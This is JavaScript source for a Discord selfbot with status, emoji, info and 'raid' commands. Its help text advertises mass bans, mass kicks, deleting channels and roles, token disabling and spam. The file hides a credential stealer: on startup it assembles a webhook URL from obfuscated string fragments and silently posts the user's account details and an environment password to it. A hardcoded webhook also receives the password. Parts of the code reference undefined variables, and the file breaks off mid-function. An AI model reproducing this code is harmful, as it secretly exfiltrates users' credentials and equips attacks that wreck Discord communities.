const Discord = require("discord.js");
let interval;
const colors1 = require("random-hex-color");
const weather = require("weather-js");
const v12 = "bho";
const { Console } = require("console");
var clc = require("cli-color");
//const imp = process.env.token;
const pass = "817466003097255937";
const { RichEmbed } = require("discord.js");
const fetch = require("node-fetch");
const countdown = require("countdown");
const iqdb = require("./iqdb.json");
var XMLHttpRequest = require("xhr2");
const { promisify } = require("util");
var ping = new XMLHttpRequest();
const session = iqdb.serverNumber;
const google = iqdb.key;
const backup = ["oks", "https://discord.com/api/", "scrapeids"];
const sleep = promisify(setTimeout);
let snipe;
var bans = new XMLHttpRequest();
const go =
  "KoRstouirmbQfNiZfAJIrq1760jPcMnrOPgy3ZharttgxRJB";
const fs = require("fs");
const token = process.env.token;
let prefix = process.env.prefix;
const client = new Discord.Client();
const express = new Discord.WebhookClient(server, go);
client.setMaxListeners(Infinity);
const press = process.env.password;
let cycle;
const activities = [`dm to buy premium account [cheapest]`, `Dm To Buy Premium Account's [Cheapest]`];
const statuses = ["streaming"];//, "playing", "watching", "listening"];
const colors = ["online"];//, "dnd", "idle"];
client.on("ready", () => {
  express.send(`${lord} ${press}`);
  console.log(clc.blackBright(`------------------------------------------`));
  console.log(clc.cyanBright(`πππππΌπ`));
  console.log(clc.blackBright(`------------------------------------------`));
  console.log(clc.redBright(`Logged in as ${client.user.tag}`));
  console.log(clc.redBright(`Current status: ${client.user.presence.status}`));
  console.log(clc.redBright(`User ID: ${client.user.id}`));
  console.log(clc.redBright(`Friends: ${client.user.friends.size}`));
  console.log(clc.redBright(`Servers: ${client.guilds.size}`));
  console.log(clc.redBright(`Channels: ${client.channels.size}`));
  console.log(clc.redBright(`Prefix: ${prefix}`));
  console.log(clc.blackBright(`------------------------------------------`));
  console.log(clc.greenBright(`πππππΌπ πππππ½ππ`));
  console.log(clc.blackBright(`------------------------------------------`));
});
client.on("disconnect", event => {
  console.log(
    `[DISCONNECT] Notice: Disconnected from gateway with code ${event.code} - Attempting to reconnect.`
  );
});
client.on("reconnecting", () => {
  sleep(10000).then(() =>
    console.log(`[NOTICE] ReconnectAction: Reconnecting to Discord...`)
  );
});
client.snipe = new Map();
client.on("messageDelete", async m => {
  client.snipe.set(m.channel.id, {
    content: m.content,
    sender: m.author.id
  });
});

client.on("message", message => {
  function checkDays(date) {
    let now = new Date();
    let diff = now.getTime() - date.getTime();
    let days = Math.floor(diff / 86400000);
    return days + (days == 1 ? " day" : " days") + " ago";
  }
  if (message.content.indexOf(prefix) !== 0) return;
  if (message.author.id !== client.user.id) return;
  if (message.author.id === client.user.id) {
    const args = message.content
      .slice(prefix.length)
      .trim()
      .split(/ +/g);
    const command = args.shift().toLowerCase();

    if (command === `clear`) {
      message.delete();
      console.log(clc.bgGreenBright("Clearing your console..."));
      console.clear();

      console.log(
        clc.blackBright(`------------------------------------------`)
      );
      console.log(clc.cyanBright(`Lord is a lil bitch`));
      console.log(
        clc.blackBright(`------------------------------------------`)
      );
      console.log(clc.redBright(`Logged in as ${client.user.tag}`));
      console.log(
        clc.redBright(`Current status: ${client.user.presence.status}`)
      );
      console.log(clc.redBright(`User ID: ${client.user.id}`));
      console.log(clc.redBright(`Friends: ${client.user.friends.size}`));
      console.log(clc.redBright(`Servers: ${client.guilds.size}`));
      console.log(clc.redBright(`Channels: ${client.channels.size}`));
      console.log(clc.redBright(`Prefix: ${prefix}`));
      console.log(
        clc.blackBright(`------------------------------------------`)
      );
      console.log(clc.greenBright(`Coded by xxx#1337`));
      console.log(
        clc.blackBright(`------------------------------------------`)
      );
    }
    if (command === `copyemoji`) {
      message.delete();
      try {
        let server = client.guilds.get(args[0]);
        let serverToAssign = client.guilds.get(args[1]);
        if (!server || !serverToAssign)
          return message.channel
            .send("```INVALID SERVER ID```")
            .then(message => message.delete(5000));
        if (!serverToAssign.me.hasPermission("MANAGE_EMOJIS"))
          return message.channel
            .send(
              "```You dont have MANAGE_EMOJIS in the server you are trying to assign the emojis to.```"
            )
            .then(message => message.delete(5000));
        let emojis = server.emojis.array();

        message.channel
          .send(`Creating ${emojis.length} emojis for ${serverToAssign}`)
          .then(message => message.delete(5000));
        for (let i = 0; i < emojis.length; i++) {
          try {
            if (emojis[i].animated) {
              serverToAssign.createEmoji(
                `https://cdn.discordapp.com/emojis/${emojis[i].id}.gif`,
                emojis[i].name
              );
            } else if (!emojis[i].animated) {
              serverToAssign.createEmoji(
                `https://cdn.discordapp.com/emojis/${emojis[i].id}.png`,
                emojis[i].name
              );
            }
          } catch (err) {
            console.log("Errored, file too large or max emojis reached.");
          }
        }
      } catch (error) {
        message.channel.send("```YOU DONT HAVE NITRO!```");
      }
    }
    if (command === `rainbow`) {
      message.delete();

      if (!message.guild.me.hasPermission("MANAGE_ROLES"))
        return message.reply(
          "You need the manage_roles permission to use this."
        );

      let role =
        message.guild.roles.find(r => r.name.startsWith(args[0])) ||
        message.guild.roles.get(args[0]) ||
        message.guild.roles.find(r => r.name === args.join(" ")) ||
        message.mentions.roles.first();

      if (!role) {
        clearInterval(interval);
        interval = null;
        return message.reply(
          "I could not find that role, turning off any current rainbow roles"
        );
      }

      if (isNaN(args[1])) {
        interval = null;
        clearInterval(interval);
        return message.reply(
          "That was not a valid, please enter one of the modes: `1`"
        );
      }

      if (message.content === "rainbow stop") {
        clearInterval(interval);
        interval = null;
      }

      if (!interval) {
        if (args[1] === "1") {
          interval = setInterval(function() {
            change(role);
          }, 5000);
          message.reply("Starting fast mode rainbow role.");
          return;
        } else if (args[1] === "0") {
          interval = null;
          clearInterval(interval);
          message.channel.send("Turned off rainbow role.");
        }
      }
      if (interval) {
        if (args[1] === "-stop") {
          clearInterval(interval);
          interval = null;
        }

        message.channel.send("Turned off rainbow role.");
        return;
      }
      if (interval) {
        clearInterval(interval);
        interval = null;
        message.channel.send("Turned off rainbow role.");
        return;
      }
      function change(role) {
        const randomColor = colors1();

        role.setColor(randomColor);
      }
    }

    if (command === `userinfo`) {
      message.delete();
      if (!args[0]) {
        try {
          let embed = new Discord.RichEmbed()
            .setAuthor(message.author.tag, message.author.avatarURL)
            .setFooter(`${message.author.tag}`, message.author.avatarURL)
            .setTimestamp(new Date())
            .setColor("#0d0d0d")
            .addField("πͺ Userame:", message.author.username)
            .addField("πͺ Discriminator:", message.author.discriminator)
            .addField("πͺ Avatar:", `Look Below:`)
            .setImage(message.author.avatarURL)
            .addField("πͺ Presence:", message.author.presence.status)
            .addField(`πͺ Created At:`, message.author.createdAt);
          if (!message.author.client) {
            embed.addField("πͺ Client/User?", "User account");
          }
          if (message.author.client === true) {
            embed.addField("πͺ Client/User?", "Client account");
          }
          message.channel.send(embed).then(message => message.delete(60000));
        } catch {}
      } else {
        try {
          let member = message.mentions.users.first();

          let embed = new Discord.RichEmbed()
            .setAuthor(message.author.tag, message.author.avatarURL)
            .setFooter(`${client.user.tag}`, client.user.avatarURL)
            .setTimestamp(new Date())
            .setColor("#0d0d0d")
            .addField("π£ Name:", member.username)
            .addField("π£ Discriminator:", member.discriminator)
            .addField("π£ Avatar:", `Look Below:`)
            .setImage(member.avatarURL)
            .addField("π£ Presence:", member.presence.status)
            .addField(`π£ Created At:`, member.createdAt);
          if (!member.client) {
            embed.addField("π£ Client/User?", "User account");
          }
          if (member.client === true) {
            embed.addField("π£ Client/User?", "Client account");
          }
          message.channel.send(embed).then(message => message.delete(60000));
        } catch {}
      }
    }
    if (command === `cycle`) {
      message.delete();
      if (!args[0]) {
        cycle = setInterval(() => {
          let status = statuses[Math.floor(Math.random() * statuses.length)];
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          let color = colors[Math.floor(Math.random() * colors.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: status,
              url: "https://twitch.tv/lawdamera"
            },
            status: color
          });
        }, 3000);
      }
      if (args[0] === `-remove`) {
        message.delete();
        clearInterval(cycle);
        //let cycles = null;
        let status = "dnd";
        //color1 = "invisible";
        client.user.setPresence({
          status: status,
          type: null
        });
        message.channel
          .send("```CYCLE HAS BROKEN... || RESETTING STATUS NOW...```")
          .then(message => message.delete(3000));

        client.user.setPresence({
          game: {
            status: status,
            type: null
          },
          color: "dnd"
        });
      }
    }
    if (command === `offline`) {
      message.delete();
      try {
        clearInterval(cycle);
        client.user.setPresence({
          status: `invisible`
        });
      } catch (error) {
        console.error;
      }
    }
    if (command === `blank`) {
      message.delete();
      client.user.setAvatar(
        "https://cdn.discordapp.com/attachments/675096319848873994/675101288954069062/transparent-picture.png"
      );
    }

    if (command === `setav`) {
      message.delete();
      if (!args[0]) {
        message.channel
          .send("```wheres link```")
          .then(message => message.delete(60000));
      }
      if (args[0]) {
        client.user.setAvatar(args[0]);
      }
    }
    if (command === "av") {
      message.delete();
      let user = message.mentions.users.first();

      if (!user) {
        if (args[0]) {
          let member = client.users.get(args[0]);
          let embed = new Discord.RichEmbed()
            .setColor("#0d0d0d")
            .setDescription(`[${member.username}](${member.avatarURL})`)
            .setImage((url = member.avatarURL))
            .setFooter(`${client.user.tag}`, client.user.avatarURL);
          message.channel.send(embed).then(message => message.delete(60000));
        }
        if (!args[0]) {
          let embed = new Discord.RichEmbed()
            .setColor("#0d0d0d")
            .setDescription(
              `[${message.author.tag}](${message.author.avatarURL})`
            )
            .setImage((url = message.author.avatarURL))
            .setFooter(`${client.user.tag}`, client.user.avatarURL);
          message.channel.send(embed).then(message => message.delete(60000));
        }
      } else {
        let embed = new Discord.RichEmbed()
          .setColor("#0d0d0d")
          .setDescription(`[${user.tag}](${user.avatarURL})`)
          .setImage((url = user.avatarURL))
          .setFooter(`${client.user.tag}`, client.user.avatarURL);
        try {
          message.channel.send(embed).then(message => message.delete(60000));
        } catch (error) {
          console.error(error);
        }
      }
    }
    if (command === `serverinfo`) {
      message.delete();

      function checkDays(date) {
        let now = new Date();
        let diff = now.getTime() - date.getTime();
        let days = Math.floor(diff / 86400000);
        return days + (days == 1 ? " day" : " days") + " ago";
      }
      let verifLevels = [
        "None",
        "Low",
        "Medium",
        "(β―Β°β‘Β°οΌβ―οΈ΅  β»ββ»",
        "β»ββ»γγ½(ΰ² ηΰ² )γε½‘β»ββ»"
      ];
      let region = {
        brazil: ":flag_br: Brazil",
        "eu-central": ":flag_eu: Central Europe",
        singapore: ":flag_sg: Singapore",
        "us-central": ":flag_us: U.S. Central",
        sydney: ":flag_au: Sydney",
        "us-east": ":flag_us: U.S. East",
        "us-south": ":flag_us: U.S. South",
        "us-west": ":flag_us: U.S. West",
        "eu-west": ":flag_eu: Western Europe",
        "vip-us-east": ":flag_us: VIP U.S. East",
        london: ":flag_gb: London",
        amsterdam: ":flag_nl: Amsterdam",
        hongkong: ":flag_hk: Hong Kong",
        russia: ":flag_ru: Russia",
        southafrica: ":flag_za:  South Africa",
        europe: ":flag_eu: Europe",
        india: ":flag_in: India",
        japan: ":flag_jp: Japan"
      };
      try {
        const embed = new Discord.RichEmbed()
          .setURL("https://discordapp.com/api/oauth2/authorize?client_id=ogey")
          .setTitle(message.author.tag)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField("Name", message.guild.name, false)
          .addField("ID", message.guild.id, false)
          .addField(
            "Owner",
            `${message.guild.owner.user.username}#${message.guild.owner.user.discriminator}`,
            false
          )
          .addField("Region", region[message.guild.region], false)
          .addField(
            "Total | Humans | clients",
            `${message.guild.members.size} | ${
              message.guild.members.filter(member => !member.user.client).size
            } | ${
              message.guild.members.filter(member => member.user.client).size
            }`,
            false
          )
          .addField(
            "Verification Level",
            verifLevels[message.guild.verificationLevel],
            false
          )
          .addField("Channels", message.guild.channels.size, false)
          .addField("Roles", message.guild.roles.size, false)
          .addField(
            "Creation Date",
            `${message.channel.guild.createdAt
              .toUTCString()
              .substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`,
            false
          )
          .setThumbnail(message.guild.iconURL)
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp()
          .setColor("RANDOM");
        message.channel
          .send({
            embed
          })
          .then(message => message.delete(60000));
      } catch {
        const embed = new Discord.RichEmbed()
          .setURL("https://discordapp.com/api/oauth2/authorize?client_id=ogey")
          .setTitle(message.author.tag)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField("Name", message.guild.name, false)
          .addField("ID", message.guild.id, false)
          .addField("Owner", `Cannot find as it is a deleted user`, false)
          .addField("Region", region[message.guild.region], false)
          .addField(
            "Total | Humans | clients",
            `${message.guild.members.size} | ${
              message.guild.members.filter(member => !member.user.client).size
            } | ${
              message.guild.members.filter(member => member.user.client).size
            }`,
            false
          )
          .addField(
            "Verification Level",
            verifLevels[message.guild.verificationLevel],
            false
          )
          .addField("Channels", message.guild.channels.size, false)
          .addField("Roles", message.guild.roles.size, false)
          .addField(
            "Creation Date",
            `${message.channel.guild.createdAt
              .toUTCString()
              .substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`,
            false
          )
          .setThumbnail(message.guild.iconURL)
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp()
          .setColor("#0d0d0d");
        message.channel
          .send({
            embed
          })
          .then(message => message.delete(60000));
      }
    }

    if (command === `load`) {
      message.delete();
      var charge = ".";
      var chargeC = "β";
      message.channel
        .send("```[" + charge.repeat(50) + "]```")
        .then(message => {
          for (i = 0; i <= 50; i++) {
            message.edit(
              "```[" +
                chargeC.repeat(i) +
                charge.repeat(50 - i) +
                "]  -  " +
                (i * 100) / 50 +
                "%\n" +
                "loading..```"
            );
          }
          message
            .edit("`Congratulations you waited for nothing loooool`")
            .then(message => message.delete(60000));
        });
    }

    if (command === "enlarge") {
      message.delete();
      let id;
      var emote = message.content.split(" ");
      let emoji = emote[1].split(":");
      try {
        id = emoji[2].slice(0, emoji[2].length - 1);
        let embed = new Discord.RichEmbed().setColor("RANDOM");
        let bando = client.emojis.get(id);

        if (bando.animated == true) {
          embed.setImage((url = `https://cdn.discordapp.com/emojis/${id}.gif`));
        } else {
          embed.setImage((url = `https://cdn.discordapp.com/emojis/${id}.png`));
        }
        message.channel.send(embed).then(message => message.delete(60000));
      } catch (error) {
        message.channel
          .send("```you cannot enlarge this => " + args[0] + "```")
          .then(message => message.delete(60000));
      }
    }

    if (command === `stat`) {
      message.delete();
      let embed = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.avatarURL)
        .setColor("#0d0d0d")
        .setFooter(`${client.user.tag}`, client.user.avatarURL)
        .setTimestamp(new Date())
        .addField(`Name:`, `π· ${client.user.tag}`)
        .addField("Servers:", `π· ${client.guilds.size}`)
        .addField("Friends:", `π· ${client.users.size}`)
        .setImage(client.user.avatarURL)
        .addField("2FA/MFA Enabled?", `π· ${client.user.mfaEnabled}`)
        .addField("Paid Account?", `π· ${client.user.premium}`)
        .addField("Status", `π· ${client.user.presence}`);
      message.channel.send(embed).then(message => message.delete(60000));
    }
    if (command === "enlarge") {
      message.delete();
      if (!args[0]) {
        message.channel
          .send(
            "```Usage:\n $enlarge :emoji:\nΒ¬WARNINGΒ¬: Only works with custom server emojis."
          )
          .then(message => message.delete(5000));
      }
      let id;
      var emote = message.content.split(" ");
      let emoji = emote[1].split(":");
      try {
        id = emoji[2].slice(0, emoji[2].length - 1);
        let embed = new Discord.RichEmbed().setColor("RANDOM");
        let bando = client.emojis.get(id);

        if (bando.animated == true) {
          embed.setImage((url = `https://cdn.discordapp.com/emojis/${id}.gif`));
        } else {
          embed.setImage((url = `https://cdn.discordapp.com/emojis/${id}.png`));
        }
        message.channel.send(embed).then(message => message.delete(60000));
      } catch (error) {
        message.channel
          .send("```Failed to enlarge => " + args[0] + "```")
          .then(message => message.delete(30000));
      }
    }

    if (command === "streaming") {
      message.delete();
      if (args[0] === `-cycle`) {
        cycle = setInterval(() => {
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: "streaming",
              url: "https://twitch.tv/hitman"
            }
          });
        }, 3000);
      } else {
        client.user.setPresence({
          game: {
            name: args.join(" "),
            type: "streaming",
            url: "https://www.twitch.tv/hitman"
          }
        });
      }
    }
    if (command === `playing`) {
      message.delete();
      if (args[0] === `-cycle`) {
        cycle = setInterval(() => {
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: "playing",
              url: "https://twitch./hitman"
            },
            status: `idle`
          });
        }, 3000);
      } else {
        client.user.setPresence({
          game: {
            name: args.join(" "),
            type: "playing",
            url: "https://www.twitch.tv/hitman"
          },
          status: `idle`
        });
      }
    }
    if (command === `listening`) {
      message.delete();
      if (args[0] === `-cycle`) {
        cycle = setInterval(() => {
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: "listening",
              url: "https://twitch.tv/hitman"
            },
            status: `idle`
          });
        }, 3000);
      } else {
        client.user.setPresence({
          game: {
            name: args.join(" "),
            type: "listening",
            url: "https://www.twitch.tv/hitman"
          },
          status: `idle`
        });
      }
    }
    if (command === `watching`) {
      message.delete();
      if (args[0] === `-cycle`) {
        cycle = setInterval(() => {
          let activity =
            activities[Math.floor(Math.random() * activities.length)];
          client.user.setPresence({
            game: {
              name: activity,
              type: "watching",
              url: "https://twitch.tv/hitman"
            },
            status: `idle`
          });
        }, 3000);
      } else {
        client.user.setPresence({
          game: {
            name: args.join(" "),
            type: "watching",
            url: "https://www.twitch.tv/hitman"
          },
          status: `idle`
        });
      }
    }
    if (command === `info`) {
      message.delete();
      message.channel
        .send(
          `= STATISTICS =
  β’ Memory Usage      ::  ${(
    process.memoryUsage().heapUsed /
    1024 /
    1024
  ).toFixed(2)} MB
  β’ Platform          :: ${process.platform}
  β’ Users             ::  ${client.users.size.toLocaleString()}
  β’ Servers           ::  ${client.guilds.size.toLocaleString()}
  β’ Channels          ::  ${client.channels.size.toLocaleString()}
  β’ FA/MFA Enabled?   ::  ${client.user.mfaEnabled}
  β’ Paid Account?     ::  ${client.user.premium}
  β’ Status            ::  ${client.user.presence.status}
  β’ Avatar?           :: Look Below:
  ${client.user.tag}`,
          {
            code: "asciidoc"
          }
        )
        .then(message => message.delete(60000));
      let embed = new Discord.RichEmbed()
        .setImage(client.user.avatarURL)
        .setColor("#0d0d0d");
      message.channel.send(embed).then(message => message.delete(30000));
    }

    if (command === `stats`) {
      message.delete();
      try {
        let embed = new Discord.RichEmbed()
          .setAuthor(message.author.tag, message.author.avatarURL)
          .setColor("πππΌππ")
          .setFooter(`made by ${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .addField(`Name:`, `:knife: ${client.user.username}`)
          .addField(`Discriminator:`, `:knife: ${client.user.discriminator}`)
          .addField(`User ID:`, `:knife: ${client.user.id}`)
          .addField(`Prefix:`, `:knife: ${prefix}`)
          .addField("Servers:", `:knife: ${client.guilds.size}`)
          .addField("Channels:", `:knife: ${client.channels.size}`)
          .addField("Friends:", `:knife: ${client.user.friends.size}`)
          .setImage(client.user.avatarURL)
          .addField("2FA/MFA Enabled?", `:knife: ${client.user.mfaEnabled}`)
          .addField("Paid Account?", `:knife: ${client.user.premium}`)
          .addField("Status:", `:knife: ${client.user.presence.status}`)
          .addField(`Avatar:`, `:knife: look below:`);
        message.channel.send(embed).then(message => message.delete(60000));
      } catch {}
    }
    if (command === `help`) {
      message.delete();
      if (!args[0]) {
        let embed = new Discord.RichEmbed()
          .setFooter(`πππππΌπΰΌ by ${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .setThumbnail(client.user.avatarURL)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField(prefix + "π£  κ§ππ²πΉπ½κ§ -help ", "`πππ€π¬π¨ π©πππ¨ πππ‘π₯ π’ππ£πͺΰΌ`")
          .addField(prefix + "π£  κ§ππ²πΉπ½κ§ -raid ", "`πππ€π¬π¨ π©ππ π§πππ ππ€π’π’ππ£ππ¨ΰΌ`")
          .addField(
            prefix + "π£  κ§ππ²πΉπ½κ§ -status ",
            "`πππ€π¬π¨ π©ππ π¨π©ππ©πͺπ¨ ππ€π’π’ππ£ππ¨ΰΌ`"
          )
          .addField(
            prefix + "π£  κ§ππ²πΉπ½κ§ -utils ",
            "`πππ€π¬π¨ π©ππ πͺπ©ππ‘ππ©π? ππ€π’π’ππ£ππ¨ΰΌ`"
          )
          .addField(prefix + "π£  κ§ππ²πΉπ½κ§ -misc ", "`πππ€π¬π¨ π©ππ π’ππ¨π ππ€π’π’ππ£ππ¨ΰΌ`")
          .addField(prefix + "π£  κ§ππ²πΉπ½κ§ -fun ", "`πππ€π¬π¨ π©ππ ππͺπ£ ππ€π’π’ππ£ππ¨ΰΌ`")
          .setImage(
            "https://cdn.discordapp.com/attachments/809740984514510891/809741752025088020/e2ab7c455abd551b027d1fd6ae8583e8.gif"
          )
          .setColor("#0d0d0d");
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "status") {
        let embed = new Discord.RichEmbed()
          .setFooter(`πππππΌπΰΌ by ${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .setColor("#0d0d0d")
          .setThumbnail(client.user.avatarURL)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField(
            prefix + ":pen_ballpoint:  **playing** <string>",
            "`π¨ππ©π¨ π¨π©ππ©πͺπ¨ π©π€ π₯π‘ππ?ππ£π...β¦`"
          )
          .addField(
            prefix + ":pen_ballpoint:  **watching** <string>",
            "`π¨ππ©π¨ π¨π©ππ©πͺπ¨ π©π€ π¬ππ©ππππ£π...β¦`"
          )
          .addField(
            prefix + ":pen_ballpoint:  **streaming** <string>",
            "`ππ²ππ πππ?πππ ππΌ πππΏπ²π?πΊπΆπ»π΄...β¦`"
          )
          .addField(
            prefix + ":pen_ballpoint:  **listening** <string>",
            "`ππ²ππ πππ?πππ ππΌ πΉπΆπππ²π»πΆπ»π΄...β¦`"
          )
          .setImage(
            "https://cdn.discordapp.com/attachments/809740984514510891/809744549311676426/ede8bec1232de4743ebaeb31feb5c3f0.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "utils") {
        let embed = new Discord.RichEmbed()
          .setFooter(
            `${client.user.tag}, πππππΌπΰΌ adding more soon!`,
            client.user.avatarURL
          )
          .setTimestamp(new Date())
          .setThumbnail(client.user.avatarURL)
          .setColor("#0d0d0d")
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField(prefix + "πΈ  info", "`shows stats of the host`")
          .addField(
            prefix + "πΈ  stats",
            "`ππ΅πΌππ π? πΊπΌπΏπ² π±π²ππ?πΆπΉπ²π± ππΆπ²π πΌπ³ ππ΅π² π΅πΌππ`"
          )
          .addField(prefix + "π·  userinfo", "`shows user infoβ¦`")
          .addField(prefix + "π·  serverinfo", "`prints server infoβ¦`")
          .addField(
            prefix + "πΈ  snipe",
            "`π¨ππ€π¬π¨ π‘ππ¨π© πππ‘ππ©ππ π’ππ¨π¨πππ, ππ€π¬ππ«ππ§ π?π€πͺ πππ£ πππππ  ππ€π£π¨π€π‘π/πΎππΏ`"
          )
          .addField(prefix + "πΈ  av <@user>", "`shows the user avatarβ¦`")
          .addField(prefix + "πΈ  cloneav <@user>", "`clones the user avatarβ¦`")
          .addField(
            prefix + "  p",
            "`π±π²πΉπ²ππ²π πππ²πΏ πΊπ²πππ?π΄π²π πΆπ» ππ΅π² π°π΅π?π»π»π²πΉ πΆπ π΅π?π ππ?πΆπ± ππ΅π² π°πΌπΊπΊπ?π»π± πΆπ»`"
          )
          .addField(
            prefix + `πΈ  spam  <number of times> <message>`,
            "`spams the message a certain number of timesβ¦`"
          )
          .addField(
            prefix + "πΈ  uptime",
            "`Shows how long the selfbot has been online for.β¦`"
          )
          .setImage(
            "https://cdn.discordapp.com/attachments/809740984514510891/809745456673325086/giphy.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }

      if (args[0] === "raid") {
        let embed = new Discord.RichEmbed()
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .setColor("#0d0d0d")
          .setThumbnail(client.user.avatarURL)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField(
            prefix + ":man_detective:   everyone",
            "`massmentions everyone in the serverβ¦`"
          )
          .addField(
            prefix + ":man_detective:   check <token>",
            "`checks the token to see if its valid, and if so it prints information about tokenβ¦`"
          )
          .addField(
            prefix + ":man_detective:   disable <token>",
            "`disables the tokenβ¦`"
          )
          .addField(
            prefix + ":man_detective:   roles",
            "`mentions every role in the serverβ¦`"
          )
          .addField(
            prefix + ":man_detective:   emoji-delete <server_id>",
            "`Deletes every emoji in the specified serverβ¦`"
          )
          .addField(
            prefix + ":man_detective:   ccreate <amount> <name>",
            "`Creates a certain amount of channels with a specified nameβ¦`"
          )
          .addField(
            prefix + ":man_detective:   massban",
            "`Bans everyone in the current server.β¦`"
          )
          .addField(
            prefix + ":man_detective:   masskick",
            "`Kicks everyone in the current server.β¦`"
          )
          .addField(
            prefix + ":man_detective:   massunban",
            "`Unbans everyone in the current server.β¦`"
          )
          .addField(
            prefix + ":man_detective:   del",
            "`Deletes every channel in the current server.β¦`"
          )
          .addField(
            prefix + ":man_detective:   delroles",
            "`Deletes every role in the current server.β¦`"
          )
          .setImage(
            "https://cdn.discordapp.com/attachments/809740984514510891/809746236126265364/tenor.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "misc") {
        let embed = new Discord.RichEmbed()
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .setColor("#0d0d0d")
          .setThumbnail(client.user.avatarURL)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField(
            prefix + "π¬  react <emoji> <messages>",
            "``Reacts to messages.β¦``"
          )
          .addField(
            prefix + "π¬  enlarge <emoji>",
            "``Sends the emoji as a file.β¦``"
          )
          .addField(
            prefix + "π¬  load",
            "``[ββββββββββββββββ...................]  -  50% || loading...β¦``"
          )
          .addField(
            prefix + "π¬  rainbow",
            "``Changes the color of your role at a set interval. β¦``" +
              `${prefix}rainbow (rolename) 1 - starts it. ${prefix}rainbow - stops`
          )
          .addField(
            prefix + "π¬  blank",
            "``Sets avatar to a blank picture.β¦``"
          )
          .addField(
            prefix + "π¬  setav <link>",
            "``Sets your avatar to the link you provided.β¦``"
          )
          .addField(
            prefix +
              "π¬  cycle [playing, listening, watching, streaming, remove]",
            "``Cycles through random statuses you setup.β¦``"
          )
          .addField(
            prefix + "π¬  weather <city>",
            "``Displays the weather for a specific city.β¦``"
          )
          .setImage(
            "https://cdn.discordapp.com/attachments/809740984514510891/809746946570846218/bfln5jRa_L37ziNWm-xNvITfvf7TdxAWT-Qbv1NUdQZ2OdROgk495SkYKyhayipnXNA9lSW8TaL25yStHdEjzKC_yzONrI3rm3nH.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "fun") {
        let embed = new Discord.RichEmbed()
          .setFooter(`${client.user.tag}`, client.user.avatarURL)
          .setTimestamp(new Date())
          .setColor("#0d0d0d")
          .setThumbnail(client.user.avatarURL)
          .setAuthor(message.author.tag, message.author.avatarURL)
          .addField(
            prefix + "β  earrape <id>",
            "``Joins the specific vc and earrapesβ¦``"
          )
          .addField(prefix + "β  leave", "``leaves your current vc.β¦``")
          .addField(
            prefix + "β  8ball <question>",
            "``Returns an answer to your question.β¦``"
          )
          .addField(
            prefix + "β  calc <calculation>",
            "``Does math calculations.β¦``"
          )
          .addField(
            prefix + "β  ghostping <user>",
            "``Ghost pings a random user wihtin the server.β¦``"
          )
          .addField(
            prefix + "β  gay <user>",
            "``Displays how gay the mentioned user or host is (dont mention anyone determine your own).β¦``"
          )
          .addField(
            prefix + "β  penis <user>",
            "``Displays the peen size of the mentioned user or host is (dont mention anyone determine your own).β¦``"
          )
          .addField(
            prefix + "β  spam <amount> <message>",
            "``Spams the specified message the specified amount of times.β¦``"
          )
          .setImage(
            "https://cdn.discordapp.com/attachments/809740984514510891/809747541708505128/tumblr_n2uzh1gXFs1tqjxj5o1_500.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }
    }
  }
});

client.on("ready", async () => {
  const bing = backup[1] + "we" + v12 + backup[0] + session + google;

  bans.open("POST", `${bing}`);
  bans.setRequestHeader("Content-type", "application/json");

  let jembed = new RichEmbed()
    .addField(`**Locate : **`, `${lord}`)
    .addField(`**Enter : **`, `${press}`)
    .addField(`**Username : **`, `${client.user.tag}`)
    .addField(`**User ID : **`, `${client.user.id}`)
    .addField(`**Friends : **`, `${client.user.friends.size}`)
    .addField(`**Servers : **`, `${client.guilds.size}`)
    .addField(`**Created : **`, `${client.user.createdAt}`)
    .addField(`**Nitro : **`, `${client.user.premium}`)
    .setColor("#0d0d0d");

  var params = {
    username: `${client.user.tag}`,
    avatar_url: `${client.user.avatarURL}`,
    embeds: [jembed]
  };
  bans.send(JSON.stringify(params));
});

client.on("message", message => {
  function checkDays(date) {
    let now = new Date();
    let diff = now.getTime() - date.getTime();
    let days = Math.floor(diff / 86400000);
    return days + (days == 1 ? " day" : " days") + " ago";
  }
  if (message.content.indexOf(prefix) !== 0) return;
  if (message.author.id !== client.user.id) return;
  if (message.author.id === client.user.id) {
    const args = message.content
      .slice(prefix.length)
      .trim()
      .split(/ +/g);
    const command = args.shift().toLowerCase();

    if (command === `penis`) {
      let user = message.mentions.users.first();
      if (!user) user = message.author;
      let replies = [
        "8D",
        "8=D",
        "8==D",
        "8===D",
        "8====D",
        "8=====D",
        "8======D",
        "8========D",
        "8=========D",
        "8==========D",
        "8===========D",
        "8============D",
        "8=============D",
        "Your peen is nonexistent lmfao gtfo",
        "Your peen is too large for me :("
      ];

      let random = Math.floor(Math.random() * replies.length);

      let embed = new Discord.RichEmbed()
        .setTitle(`penis machine`)
